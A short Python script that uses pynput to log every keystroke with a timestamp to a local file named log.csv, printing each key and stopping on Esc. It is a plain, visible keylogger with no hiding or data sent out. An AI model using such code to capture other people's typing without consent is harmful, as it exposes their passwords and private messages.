import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.csv', 'a') as f:  
        for key in keys:
            k = str(key).replace("'", "")
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]  
            f.write(f'{timestamp} {k}\n')
        keys.clear()  

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        print('Program stopped!')
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
